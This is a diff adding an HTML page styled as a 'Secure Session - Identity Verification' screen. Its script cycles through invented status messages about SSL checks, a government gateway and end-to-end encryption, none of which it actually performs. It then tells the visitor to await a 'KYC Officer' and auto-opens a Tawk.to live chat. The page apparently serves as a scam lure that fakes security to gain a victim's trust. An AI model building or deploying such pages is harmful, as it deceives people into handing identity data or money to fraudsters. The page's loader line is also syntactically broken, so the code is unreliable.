@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Session - Identity Verification</title>
+    <style>
+        body { 
+            font-family: "Source Sans Pro", Arial, sans-serif; 
+            background-color: #e7eff6; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .loader-container { 
+            text-align: center; 
+            background: white; 
+            padding: 50px; 
+            border-radius: 12px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
+            width: 450px; 
+            border: 1px solid #d1d9e0;
+        }
+        .spinner {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #003366;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status-text { 
+            font-size: 20px; 
+            color: #003366; 
+            font-weight: bold; 
+            margin-bottom: 10px; 
+        }
+        .loading-details { 
+            font-size: 15px; 
+            color: #666; 
+            line-height: 1.4;
+        }
+        #final-message {
+            display: none;
+            color: #003366;
+            font-weight: bold;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader-container" id="main-container">
+        <!-- Loading State -->
+        <div id="loading-section">
+            <div class="spinner"></div>
+            <div id="status" class="status-text">Initializing Secure Tunnel...</div>
+            <div id="details" class="loading-details">Establishing encrypted connection to secure servers...</div>
+        </div>
+
+        <!-- Final State -->
+        <div id="final-message">
+            Secure Tunnel Established.<br>
+            Please wait for your KYC Officer in the chat.
+        </div>
+    </div>
+
+    <!-- Logic Scripts -->
+    <script type="text/javascript">
+        /* ==========================================
+           CONFIGURATION
+           ========================================== */
+        const TAWK_PROPERTY_ID = '69fdb0e62de8f51c3331651b/1jo3fm1vi'; // REPLACE THIS
+
+        /* ==========================================
+           TAWK.TO INITIALIZATION
+           ========================================== */
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+            var s=document.createElement('script'),s.async=true,s.src='https://embed.tawk.to/'+TAWK_PROPERTY_ID+'/default';
+            s.setAttribute('crossorigin','anonymous');document.head.appendChild(s);
+        })();
+
+        /* ==========================================
+           ANIMATION LOGIC
+           ========================================== */
+        const statusText = document.getElementById('status');
+        const detailsText = document.getElementById('details');
+        const loadingSection = document.getElementById('loading-section');
+        const finalMessage = document.getElementById('final-message');
+
+        const steps = [
+            { s: "Verifying SSL Certificates...", d: "Checking SHA-256 encryption handshake..." },
+            { s: "Authenticating Session...", d: "Connecting to secure government gateway..." },
+            { s: "Securing Connection...", d: "Routing through encrypted proxy..." },
+            { s: "Finalizing Secure Tunnel...", d: "Establishing end-to-end encryption..." }
+        ];
+        let currentStep = 0;
+
+        // Animation Sequence
+        const interval = setInterval(() => {
+            if (currentStep < steps.length) {
+                statusText.innerText = steps[currentStep].s;
+                detailsText.innerText = steps[currentStep].d;
+                currentStep++;
+            } else {
+                clearInterval(interval);
+                showFinalState();
+            }
+        }, 2000);
+
+        function showFinalState() {
+            // 1. Switch UI from loading to final confirmation
+            loadingSection.style.display = 'none';
+            finalMessage.style.display = 'block';
+
+            // 2. Open and maximize the Tawk.to chat window automatically
+            setTimeout(function() {
+                if (typeof Tawk_API !== 'undefined' && Tawk_API.maximize) {
+                    Tawk_API.maximize();
+                }
+            }, 500);
+        }
+    </script>
+</body>
+</html>
